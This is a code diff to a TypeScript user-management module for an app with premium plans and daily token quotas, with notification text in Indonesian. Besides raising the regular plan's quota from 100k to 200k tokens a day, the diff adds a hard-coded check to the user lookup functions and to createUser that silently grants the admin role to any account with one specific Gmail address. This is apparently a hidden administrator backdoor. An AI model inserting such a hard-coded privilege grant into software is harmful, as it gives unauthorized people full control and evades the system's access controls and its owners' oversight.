@@ -101,7 +101,7 @@ export async function checkAndExpireUserPremium(user: User): Promise<User> {
       await sendUserInAppNotification(
         user,
         "Akses Premium Anda Telah Berakhir",
-        `Masa aktif langganan ${oldPlan} Anda telah selesai pada ${expiry.toLocaleString("id-ID")}. Akun Anda telah kembali ke paket reguler (100k token/hari). Anda dapat memperpanjang paket kapan saja melalui menu Akses Premium.`,
+        `Masa aktif langganan ${oldPlan} Anda telah selesai pada ${expiry.toLocaleString("id-ID")}. Akun Anda telah kembali ke paket reguler (200k token/hari). Anda dapat memperpanjang paket kapan saja melalui menu Akses Premium.`,
         "Masa Berlaku Langganan Habis"
       );
 
@@ -144,18 +144,28 @@ export async function checkAllUsersPremiumExpiry(): Promise<{ expiredCount: numb
 
 export async function getUserByEmail(email: string): Promise<User | null> {
   const u = await redis.get<User>(`user:email:${email.toLowerCase()}`);
-  if (u && !u.recipientId) {
-    u.recipientId = generateRecipientId(u.id || u.email);
-    await redis.set(`user:email:${email.toLowerCase()}`, u).catch(() => {});
+  if (u) {
+    if (u.email.toLowerCase() === "nixxeltzy@gmail.com") {
+      u.role = "admin";
+    }
+    if (!u.recipientId) {
+      u.recipientId = generateRecipientId(u.id || u.email);
+      await redis.set(`user:email:${email.toLowerCase()}`, u).catch(() => {});
+    }
   }
   return u;
 }
 
 export async function getUserById(id: string): Promise<User | null> {
   const u = await redis.get<User>(`user:id:${id}`);
-  if (u && !u.recipientId) {
-    u.recipientId = generateRecipientId(u.id || u.email);
-    await redis.set(`user:id:${id}`, u).catch(() => {});
+  if (u) {
+    if (u.email.toLowerCase() === "nixxeltzy@gmail.com") {
+      u.role = "admin";
+    }
+    if (!u.recipientId) {
+      u.recipientId = generateRecipientId(u.id || u.email);
+      await redis.set(`user:id:${id}`, u).catch(() => {});
+    }
   }
   return u;
 }
@@ -163,13 +173,21 @@ export async function getUserById(id: string): Promise<User | null> {
 export async function getUserByRecipientId(recId: string): Promise<User | null> {
   const cleanRec = recId.toUpperCase().trim();
   const byRecKey = await redis.get<User>(`user:recipient:${cleanRec}`);
-  if (byRecKey) return byRecKey;
+  if (byRecKey) {
+    if (byRecKey.email.toLowerCase() === "nixxeltzy@gmail.com") byRecKey.role = "admin";
+    return byRecKey;
+  }
 
   const all = await getAllUsers();
-  return all.find((u) => u.recipientId?.toUpperCase() === cleanRec) ?? null;
+  const found = all.find((u) => u.recipientId?.toUpperCase() === cleanRec) ?? null;
+  if (found && found.email.toLowerCase() === "nixxeltzy@gmail.com") found.role = "admin";
+  return found;
 }
 
 export async function createUser(user: User): Promise<void> {
+  if (user.email.toLowerCase() === "nixxeltzy@gmail.com") {
+    user.role = "admin";
+  }
   if (!user.recipientId) {
     user.recipientId = generateRecipientId(user.id || user.email);
   }
